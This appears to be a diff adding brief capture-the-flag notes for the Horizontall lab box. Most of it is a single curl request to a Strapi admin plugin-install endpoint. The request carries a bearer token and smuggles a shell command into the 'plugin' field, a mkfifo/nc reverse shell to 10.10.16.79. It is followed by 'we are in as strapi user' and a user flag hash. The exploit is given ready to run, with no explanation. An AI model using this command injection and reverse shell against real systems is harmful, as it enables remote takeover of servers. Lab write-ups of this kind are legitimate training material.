@@ -1,0 +1,4 @@
+curl -i -s -k -X $'POST' -H $'Host: api-prod.horizontall.htb' -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwMzE5NzEwLCJleHAiOjE2MzI5MTE3MTB9.AfJr81dyxnmzlutCKArmf0kBgFCcDDhsk91IYNDpTFM' -H $'Content-Type: application/json' -H $'Origin: http://api-prod.horizontall.htb' -H $'Content-Length: 123' -H $'Connection: close' --data $'{\"plugin\":\"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.79 6969 >/tmp/f)\",\"port\":\"80\"}' $'http://api-prod.horizontall.htb/admin/plugins/install'
+
+and we are in as strapi user 
+#userflag : 1d9ed12ca245af75cd07f96fd6bcd138
